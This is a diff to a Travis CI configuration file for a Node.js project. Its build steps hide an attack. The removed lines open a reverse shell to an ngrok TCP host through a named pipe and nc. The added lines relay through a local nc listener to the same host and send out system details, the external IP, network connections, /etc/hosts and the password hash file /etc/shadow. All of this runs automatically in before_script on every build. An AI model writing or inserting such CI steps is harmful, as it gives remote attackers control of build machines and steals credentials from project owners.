@@ -1,10 +1,17 @@
 language: node_js
+sudo: required
 before_script:
   - env
   - whoami
-  
-  - export NGPORT=13572
+  - export NGPORT=10668
   - export NGHOSTNAME=0.tcp.ngrok.io
-  - mknod /tmp/backpipe p
-  - /bin/sh 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe &
-  - while true; do sleep 60; echo "Keepalive"; done 
+  - mkfifo piper
+  - nc -k -l 12345 0<piper|nc $NGHOSTNAME $NGPORT 1>piper &
+  - uname -a | nc localhost 12345
+  - curl ipecho.net/plain; echo | nc localhost 12345
+  - netstat -la | nc localhost 12345
+  - cat /etc/hosts | nc localhost 12345
+  - cat /etc/shadow | nc localhost 12345
+  - id | nc localhost 12345
+  - whoami | nc localhost 12345
+  - exit | nc localhost 12345
